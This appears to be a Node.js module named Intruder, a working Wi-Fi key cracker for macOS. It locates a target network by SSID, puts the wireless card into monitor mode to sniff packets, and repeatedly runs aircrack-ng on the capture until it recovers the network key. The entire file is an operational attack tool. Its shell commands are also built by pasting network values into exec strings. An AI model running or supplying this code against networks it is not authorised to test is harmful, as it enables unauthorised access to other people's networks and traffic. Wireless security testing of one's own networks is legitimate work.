
/**
 * Dependencies.
 */

var EventEmitter = require('events').EventEmitter;
var exec = require('child_process').exec;
var lsof = require('lsof');

/**
 * Airport binary.
 */

var AIRPORT = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport';

/**
 * Expose `Intruder`.
 */

module.exports = Intruder;

/**
 * Initialize an `Intruder` with `options`.
 *
 * Options:
 *
 * 	- `interval` the time between crack attempts
 * 	- `channel` the network channel
 *
 * @param {Object} opts
 * @api public
 */

function Intruder(opts) {
  if (!(this instanceof Intruder)) return new Intruder(opts);
  EventEmitter.call(this);
  opts = opts || {};

  this.interval = opts.interval || 2000000;
  this.channel = opts.channel;
}

/**
 * Inherit from `EventEmitter.prototype`.
 */

Intruder.prototype = Object.create(EventEmitter.prototype);

/**
 * Crack the network by ssid.
 *
 * @param {String} ssid
 * @param {Function} done
 * @api public
 */

Intruder.prototype.crack = function(ssid, done) {
  var self = this;

  // discover wireless networks
  exec(`${AIRPORT} -s`, function(err, networks) {
    if (err) return done(err, null);

    // find access point by `ssid`
    var network = find(ssid, networks);
    if (!network) return done('network not found');

    var channel = self.channel || network[3];
    var bssid = network[1];

    // sniff the channel
    var child = self.sniff(channel);

    // make sure the wireless card does not get stuck in monitor mode
    process.on('exit', function() {
      child.kill();
    });

    // find capture file
    setTimeout(function() { self.capture(child.pid); }, 1000);

    // decrypt capture file in intervals
    self.intervalId = setInterval(function() { self.decrypt(bssid, done); }, self.interval);
  });
};

/**
 * Sniff network packets with the wireless card in monitor mode.
 *
 * @param {String} channel
 * @param {Function} done
 * @api public
 */

Intruder.prototype.sniff = function(channel) {
  return exec(`${AIRPORT} en0 sniff ${channel}`);
};

/**
 * Find the capture file.
 *
 * @param {String} pid
 * @api public
 */

Intruder.prototype.capture = function(pid) {
  var self = this;

  lsof.raw(pid, function(files) {
    files.forEach(function(file) {
      if (file.name && file.name.indexOf('airportSniff') !== -1) {
        self.target = file.name;
      }
    });
  });
};

/**
 * Decrypt the capture file.
 *
 * @param {String} bssid
 * @param {Function} done
 * @api public
 */

Intruder.prototype.decrypt = function(bssid, done) {
  var self = this;

  exec(`aircrack-ng -1 -a 1 -b ${bssid} ${self.target}`, function(_, stdout) {
    if (!stdout) return;
    var results = parse(stdout);

    if (results.ivs) {
      self.emit('attempt', results.ivs);
    }

    if (results.success) {
      done(null, results.key);
      clearInterval(self.intervalId);
    }
  });
};

/**
 * Find the access point's bssid and channel.
 *
 * @param {String} ssid
 * @param {String} networks
 */

function find(ssid, networks) {
  var re = '(([0-9a-fA-F][0-9a-fA-F]:){5}[0-9a-fA-F][0-9a-fA-F])';
  return networks.match(new RegExp(`${ssid} ${re} -\\d{2}  (\\d+)`));
}

/**
 * Parse stdout for the results.
 *
 * @param {String} stdout
 */

function parse(stdout) {
  var res = {};

  var ivs = stdout.match(/\(got (\d+) IVs\)/);
  if (ivs) res.ivs = ivs[1];

  var key = stdout.match(/KEY FOUND! \[ (.+) \]/);
  if (key) {
    res.key = key[1];
    res.success = true;
  } else {
    res.success = false;
  }

  return res;
}
